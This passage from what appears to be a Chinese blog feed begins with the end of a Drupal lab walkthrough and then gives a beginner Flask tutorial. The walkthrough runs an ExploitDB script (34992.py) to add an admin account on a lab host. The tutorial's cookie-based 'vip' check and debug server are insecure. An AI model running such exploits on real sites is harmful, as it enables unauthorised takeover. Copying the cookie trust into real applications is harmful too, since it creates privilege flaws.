alt="img"></p><p>用生成好的密码替换掉管理员的密码</p><p>方法2：</p><p>使用漏洞创建一个用户</p><p>打开msf-msfconsole</p><p>searchsploit Druqal</p><p>找到add admin user的漏洞</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35967540/1709204488695-3207e116-d0d8-40ac-ad86-dddcedf4d14f.png" alt="img"></p><p>python &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;34992.py -t <a href="http://172.20.10.9/">http://172.20.10.9</a> -u 用户名 -p 密码</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>flask</title>
    <link href="/2023/12/16/flask/"/>
    <url>/2023/12/16/flask/</url>
    
    <content type="html"><![CDATA[<p>python中flask的相关基本操作</p><span id="more"></span><p>[TOC]</p><h1 id="一、基本配置"><a href="#一、基本配置" class="headerlink" title="一、基本配置"></a>一、基本配置</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建flask程序</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/a&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a_page</span>():</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;this is a page&quot;</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#装饰器，关联路由</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span>,debug=<span class="literal">True</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h1 id="二、请求和参数"><a href="#二、请求和参数" class="headerlink" title="二、请求和参数"></a>二、请求和参数</h1><h2 id="1-参数传入"><a href="#1-参数传入" class="headerlink" title="1. 参数传入"></a>1. 参数传入</h2><p>建立当前项目目录下创建static和templates文件夹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__,</span><br><span class="line">            static_url_path=<span class="string">&#x27;/static&#x27;</span>,<span class="comment">#静态文件路径</span></span><br><span class="line">            static_folder=<span class="string">&#x27;static&#x27;</span>,</span><br><span class="line">            template_folder=<span class="string">&#x27;templages&#x27;</span><span class="comment">#模板文件</span></span><br><span class="line">            )</span><br></pre></td></tr></table></figure><p>此时便可通过路由访问文件中的1.jpg了</p><img src="/2023/12/16/flask/1685866896016-44b6c6bd-0e43-49b7-9a31-40a95f923754.png" class><h2 id="2-交互"><a href="#2-交互" class="headerlink" title="2. 交互"></a>2. 交互</h2><h3 id="2-1-‘-’直接传参"><a href="#2-1-‘-’直接传参" class="headerlink" title="2.1 ‘&#x2F;’直接传参"></a>2.1 ‘&#x2F;’直接传参</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/a/&lt;user_id&gt;/&lt;int:user_pass&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a_page</span>(<span class="params">user_id,user_pass</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;this is %s--%s &quot;</span>%(user_id,user_pass)</span><br><span class="line">  <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>添加路由&#x2F;whk&#x2F;123456</p><img src="/2023/12/16/flask/1685867513147-abbef103-a553-4fa6-9293-0bdbb6d0f4ad.png" class><h3 id="2-2-？传参"><a href="#2-2-？传参" class="headerlink" title="2.2 ？传参"></a>2.2 ？传参</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/a&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a_page</span>():</span><br><span class="line">    user_id = request.args.get(<span class="string">&#x27;uid&#x27;</span>)</span><br><span class="line">    user_pass = request.args.get(<span class="string">&#x27;upass&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;this is %s--%s &quot;</span>%(user_id,user_pass)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ttp:&#x2F;&#x2F;10.0.132.18:8888&#x2F;a?uid&#x3D;whk&amp;upass&#x3D;123456</p><img src="/2023/12/16/flask/1685868192171-d306eafc-2ff7-4e6d-8be4-65d38c4ceff0.png" class><h1 id="三、用户信息获取"><a href="#三、用户信息获取" class="headerlink" title="三、用户信息获取"></a>三、用户信息获取</h1><p>1.request.method</p><p>获取请求类型</p><p>2.request.headers</p><p>获取请求头</p><p>2.1 request.headers.get(‘User-Agent’)</p><p>单独获取访问浏览器</p><ol start="3"><li>request.path       获取路径</li></ol><p>​     request.full_path        完整路径</p><h1 id="四、字典与json"><a href="#四、字典与json" class="headerlink" title="四、字典与json"></a>四、字典与json</h1><h2 id="1-字典转化为json"><a href="#1-字典转化为json" class="headerlink" title="1.字典转化为json"></a>1.字典转化为json</h2><p>json.dumps()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/d&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dict</span>():</span><br><span class="line">    <span class="comment">#定义一个字典</span></span><br><span class="line">    json_dict = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>:<span class="string">&quot;whk&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>:<span class="string">&quot;19&quot;</span>,</span><br><span class="line">        <span class="string">&quot;score&quot;</span>:<span class="string">&quot;100&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#字典转化为json字符串</span></span><br><span class="line">    result = json.dumps(json_dict)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="2-json转化为字典"><a href="#2-json转化为字典" class="headerlink" title="2.json转化为字典"></a>2.json转化为字典</h2><p><code>dict1 = json.laods(&#39;&#123;&quot;name&quot;:&quot;whk&quot;,&quot;age&quot;:&quot;19&quot;,&quot;score&quot;:&quot;100&quot;&#125;&#39;)</code></p><h1 id="五、重定向"><a href="#五、重定向" class="headerlink" title="五、重定向"></a>五、重定向</h1><h2 id="1-站外重定向"><a href="#1-站外重定向" class="headerlink" title="1.站外重定向"></a>1.站外重定向</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/redirect&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cdx</span>():</span><br><span class="line">    <span class="comment">#站外</span></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(<span class="string">&#x27;http://bilibili.com&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="2-站外重定向"><a href="#2-站外重定向" class="headerlink" title="2.站外重定向"></a>2.站外重定向</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#重定向</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/redirect&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cdx</span>():</span><br><span class="line">    <span class="comment">#站外</span></span><br><span class="line">    <span class="comment">#return flask.redirect(&#x27;http://bilibili.com&#x27;)</span></span><br><span class="line">    <span class="comment">#站外</span></span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;dx1&#x27;</span>)) <span class="comment">#写入函数名</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rd1&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dx1</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;你来了宝贝&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="3-404重定向"><a href="#3-404重定向" class="headerlink" title="3. 404重定向"></a>3. 404重定向</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#404重定向</span></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;出错了 404 not-found&#x27;</span>,<span class="number">404</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h1 id="六、url别名"><a href="#六、url别名" class="headerlink" title="六、url别名"></a>六、url别名</h1><p>某个路由太长，可以使用url别名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#url别名</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/solongsolongsolong&#x27;</span>,endpoint=<span class="string">&#x27;connect&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hi&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/short&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tx1</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&#x27;connect&#x27;</span>)) <span class="comment">#内网重定向</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h1 id="七、异常处理"><a href="#七、异常处理" class="headerlink" title="七、异常处理"></a>七、异常处理</h1><h2 id="1-假异常"><a href="#1-假异常" class="headerlink" title="1. 假异常"></a>1. 假异常</h2><p>于return后面加入一个404</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/fake&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>,<span class="number">404</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>页面可以打开，但返还的请求值为404</p><p>可以应用于防御黑客的扫描，让其忽视404页面</p><h2 id="2-主动抛出异常"><a href="#2-主动抛出异常" class="headerlink" title="2. 主动抛出异常"></a>2. 主动抛出异常</h2><p><strong>flask.abort(404)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">flask.abort(<span class="number">404</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>,<span class="number">404</span></span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h1 id="八、html返回"><a href="#八、html返回" class="headerlink" title="八、html返回"></a>八、html返回</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> Response(<span class="string">&#x27;html代码&#x27;</span>，<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h1 id="九、模块"><a href="#九、模块" class="headerlink" title="九、模块"></a>九、模块</h1><h2 id="1-链接html文件"><a href="#1-链接html文件" class="headerlink" title="1.链接html文件"></a>1.链接html文件</h2><p>在templates建立html文件</p><img src="/2023/12/16/flask/1685868192171-d306eafc-2ff7-4e6d-8be4-65d38c4ceff0.png" class><p>retern flask.render_template(“xxx.html”)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>c路由测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>this is h1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/c&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">moban</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&quot;temp.html&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>接着就可以直接由c路由访问到html文件了</p><img src="/2023/12/16/flask/1685956646529-bb0e74f0-4bad-45c8-96d5-76bd27910261.png" class><h2 id="2-父模块"><a href="#2-父模块" class="headerlink" title="2. 父模块"></a>2. 父模块</h2><p><strong>父模板</strong></p><p>建立一个子HTML</p><img src="/2023/12/16/flask/1685956972644-8131a6d6-7cc9-4100-8c06-ee14841a1e9e.png" class><p>在子HTML写入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &#x27;temp.html‘ %&#125;</span><br></pre></td></tr></table></figure><p>修改路径到zi1.html</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/c&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">moban</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&quot;zi1.html&quot;</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>最后就可知直接访问到temp.html了</p><img src="/2023/12/16/flask/1685957341965-eccb6bb4-9876-422c-a1ee-1bf713cd3a3c.png" class><h2 id="3-继承"><a href="#3-继承" class="headerlink" title="3. 继承"></a>3. 继承</h2><p>有时候会经常用到同一html页面，此时可用子模版继承方法</p><p><em>关键语句</em></p><p><strong><code>&#123;% block contenBlock %&#125;`**  **`&#123;&#123;super()&#125;&#125;`**      #继承语句，没有则不继承**`&#123;% endblock %&#125;</code></strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 子模版</span><br><span class="line">&#123;% extends &#x27;temp.html&#x27; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block contenBlock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;super()&#125;&#125;  <span class="comment">&lt;!--继承父模板*/--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>这是子模版<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 父模板</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>c路由测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>this is father temp<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% block contenBlock %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是继承的父模板<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>end<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时访问效果</p><img src="/2023/12/16/flask/1685958749976-38a28fb0-f1a3-4cf6-a036-a4fbbb1457fe.png" class><h1 id="十、过滤器"><a href="#十、过滤器" class="headerlink" title="十、过滤器"></a>十、过滤器</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#过滤器</span></span><br><span class="line"><span class="meta">@app.template_filter(<span class="params"><span class="string">&#x27;rever&#x27;</span></span>)  </span><span class="comment">#括号中的为过滤器名字</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_reverse</span>(<span class="params">li</span>):</span><br><span class="line">    temp = <span class="built_in">list</span>(li)</span><br><span class="line">    temp.reverse()</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line">    <span class="keyword">pass</span>              <span class="comment">#这是一个作用为颠倒列表顺序的过滤器</span></span><br></pre></td></tr></table></figure><p><code>&lt;h2&gt;u_list is &#123;&#123;ulist | rever&#125;&#125;&lt;/h2&gt;</code></p><img src="/2023/12/16/flask/1685968527561-fb1e1c46-e75a-4b3c-8785-f4f554512cea.png" class><h1 id="十一、控制代码块"><a href="#十一、控制代码块" class="headerlink" title="十一、控制代码块"></a>十一、控制代码块</h1><p><strong><code>&#123;%....%&#125;</code></strong></p><h3 id="eg1：遍历列表中的元素，并使用html规则打印在屏幕上"><a href="#eg1：遍历列表中的元素，并使用html规则打印在屏幕上" class="headerlink" title="eg1：遍历列表中的元素，并使用html规则打印在屏幕上"></a>eg1：遍历列表中的元素，并使用html规则打印在屏幕上</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for i in ulist %&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;i&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>结果如下：</p><img src="/2023/12/16/flask/1685968895983-4a9c31d9-d1fe-4c52-a9df-06a712afde44.png" class><h3 id="eg2：判断是否为vip并给出相应的反馈"><a href="#eg2：判断是否为vip并给出相应的反馈" class="headerlink" title="eg2：判断是否为vip并给出相应的反馈"></a>eg2：判断是否为vip并给出相应的反馈</h3><p>还是刚刚那个路由</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/c/&lt;id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">moban</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    u_id = <span class="built_in">id</span></span><br><span class="line">    u_list = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">    u_vip = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&quot;zi1.html&quot;</span>,uid=u_id,ulist=u_list,vip=u_vip)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>后端</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if vip == 0 %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>你不是vip<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">&#123;% elif vip == 1 %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>您是一级vip<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>结果:</p><img src="/2023/12/16/flask/1685970207348-b33e728e-0547-4ca5-8961-3c96064281d1.png" class><p>并且通过检查并不能查看后端完整代码</p><h1 id="十二、cookie交互"><a href="#十二、cookie交互" class="headerlink" title="十二、cookie交互"></a>十二、cookie交互</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置cookie</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    response = flask.make_response(<span class="string">&quot;登入&quot;</span>)</span><br><span class="line">    <span class="comment"># 设置cookie</span></span><br><span class="line">    response.set_cookie(<span class="string">&#x27;u_id&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,max_age=<span class="number">300</span>)</span><br><span class="line">    response.set_cookie(<span class="string">&#x27;vip&#x27;</span>,<span class="string">&#x27;0&#x27;</span>, max_age=<span class="number">300</span>)  <span class="comment">#设置参数要加引号</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>():</span><br><span class="line">    <span class="comment">#读取cookie</span></span><br><span class="line">    u_id = request.cookies.get(<span class="string">&#x27;u_id&#x27;</span>)</span><br><span class="line">    vip = request.cookies.get(<span class="string">&#x27;vip&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;cookie_test.html&#x27;</span>,uid=u_id,vip=vip)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除cookie</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = flask.make_response(<span class="string">&quot;退出&quot;</span>)</span><br><span class="line">    response.delete_cookie(<span class="string">&#x27;u_id&#x27;</span>)</span><br><span class="line">    response.delete_cookie(<span class="string">&#x27;vip&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h3&gt;&#123;&#123;uid&#125;&#125; 号用户&lt;/h3&gt;</span><br><span class="line">&#123;% if vip == &#x27;0&#x27; %&#125;</span><br><span class="line">&lt;h2&gt;你不是vip&lt;/h2&gt;</span><br><span class="line">&#123;% elif vip == &#x27;1&#x27; %&#125;</span><br><span class="line">&lt;h2&gt;您是一级vip&lt;/h2&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p><em>Tips：</em></p><p><strong>max_age</strong>为cookie最长存放时间，以秒计时</p><p>设置参数要加引号，html中判断同样要引号</p><h1 id="十三、session"><a href="#十三、session" class="headerlink" 